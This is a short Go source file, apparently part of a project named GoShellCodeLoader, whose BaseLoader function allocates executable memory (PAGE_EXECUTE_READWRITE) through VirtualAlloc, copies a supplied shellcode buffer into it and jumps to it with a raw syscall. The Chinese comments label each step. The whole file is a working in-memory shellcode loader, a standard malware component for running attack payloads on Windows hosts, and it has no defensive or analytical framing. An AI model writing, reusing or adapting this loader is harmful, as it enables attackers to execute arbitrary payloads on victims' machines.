package Loader

import (
	"GoShellCodeLoader/API"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

func BaseLoader(shellcode []byte) {
	// 获取 Windows API
	api, _ := API.SetWindowsAPI()

	// 调用 VirtualAlloc 分配内存
	allocSize := uintptr(len(shellcode))
	mem, _, _ := api.VirtualAlloc().Call(uintptr(0), allocSize, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		panic("VirtualAlloc failed")
	}

	// 将 shellcode 复制到分配的内存空间
	buffer := (*[0x1_000_000]byte)(unsafe.Pointer(mem))[:allocSize:allocSize]
	copy(buffer, shellcode)

	// 执行 shellcode
	syscall.Syscall(mem, 0, 0, 0, 0)
}
